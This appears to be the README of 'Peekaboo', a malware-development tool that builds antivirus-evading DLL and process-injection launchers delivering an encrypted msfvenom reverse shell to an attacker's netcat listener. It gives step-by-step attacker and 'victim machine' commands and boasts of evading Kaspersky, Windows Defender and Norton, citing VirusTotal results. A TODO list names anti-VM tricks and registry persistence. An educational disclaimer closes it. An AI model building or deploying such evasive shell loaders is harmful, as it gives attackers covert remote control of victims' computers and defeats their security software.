# Peekaboo

Simple undetectable shellcode and code injector launcher example. Inspired by RTO malware development course.

## Main logic

XOR encryption and decryption for functions call and main payload - `msfvenom` reverse shell as example.

## Usage
## 1. DLL
### on attacker machine

check your IP:
```bash
ip a
```

![attacker machine IP](./screenshots/2022-04-24_13-05.png?raw=true)

run python script with flags:
```bash
python3 peekaboo.py -l 192.168.56.1 -p 4444 --build 1
```

![run python script](./screenshots/2022-04-24_13-08.png?raw=true)

### then on victim machine (windows 10 x64):
run on powershell or cmd promt:
```cmd
rundll32 .\peekaboo.dll, lCiSdbvIAaeZLHFfkUhEcbOy
```

![run on victim machine](./screenshots/2022-04-24_13-11.png?raw=true)

### check on attacker machine:
check your netcat listener:

![check netcat listener](./screenshots/2022-04-24_13-12.png?raw=true)

![check IP address](./screenshots/2022-04-24_13-13.png?raw=true)

## 2.Injector
### on attacker machine:
check attacker ip:
```bash
ip a
```

![check IP](./screenshots/2022-04-24_13-05.png?raw=true)

run python script on linux (for example process `mspaint.exe`):
```bash
python3 peekaboo.py -l 192.168.56.1 -p 4444 -e mspaint.exe --build 2
```

![run python script](./screenshots/2022-04-24_13-18.png?raw=true)

### then on victim machine run (windows 10 x64):
```cmd
.\peekaboo.exe
```

or click (if `-m windows` param)

![run on victim machine](./screenshots/2022-04-24_13-20.png?raw=true)

### check on attacker machine:
check your netcat listener:

![check netcat listener](./screenshots/2022-04-24_13-22.png?raw=true)

## 3. NT API injector
run python script on linux (for example process `mspaint.exe`):
```bash
python3 peekaboo.py -l 192.168.56.1 -p 4444 -e mspaint.exe -m console --build 3
```

![enc and compile nt](./screenshots/2022-04-24_13-25.png?raw=true)

### then on victim machine (windows 10 x64):
```cmd
.\peekaboo.exe
```

![run malware](./screenshots/2022-04-24_13-27.png?raw=true)    

![run malware](./screenshots/2022-04-24_13-29.png?raw=true)

## Issues.
Tested on:
1. Attacker machines: Kali linux 2020.1, Windows 10 x64
2. Victim machine: Windows 7 x64, Windows 10 x64
3. Payload: windows x64 reverse shell from msfvenom
4. AV Engines: Kaspersky, Windows Defender, Norton Antivirus Plus

## virus total result:
02 september 2021

![virustotal](./screenshots/11.png?raw=true)

[https://www.virustotal.com/gui/file/c930b9aeab693d36c68e7bcf6353c7515b8fffc8f9a9233e49e90da49ab5d470/detection](https://www.virustotal.com/gui/file/c930b9aeab693d36c68e7bcf6353c7515b8fffc8f9a9233e49e90da49ab5d470/detection)

30 december 2021 (NT API injector)    

![virtustotal 2](./screenshots/16.png?raw=true)    

[https://www.virustotal.com/gui/file/743f50e92c6ef48d6514e0ce2a255165f83afb1ae66deefd68dac50d80748e55/detection](https://www.virustotal.com/gui/file/743f50e92c6ef48d6514e0ce2a255165f83afb1ae66deefd68dac50d80748e55/detection)    

## antiscan.me result:

11 january 2022 (NT API injector)    

![antiscan](./screenshots/antiscan.png?raw=true)    

[https://antiscan.me/scan/new/result?id=rQVfQhoFYgH9](https://antiscan.me/scan/new/result?id=rQVfQhoFYgH9)    

## TODO
- [x] Compile injector in Kali linux
- [x] XOR + AES [aes branch](https://github.com/cocomelonc/peekaboo/tree/aes)
- [x] Calling Windows API functions by hash names
- [x] Find Kernel32 base via asm style
- [x] One python builder
- [ ] Anti-VM tricks
- [ ] Persistence via Windows Registry run keys
- [ ] Replace msfvenom shell to donut payload???

## Attention
This tool is a Proof of Concept and is for Educational Purposes Only!!! Author takes no responsibility of any damage you cause

## License
[MIT](https://choosealicense.com/licenses/mit/)
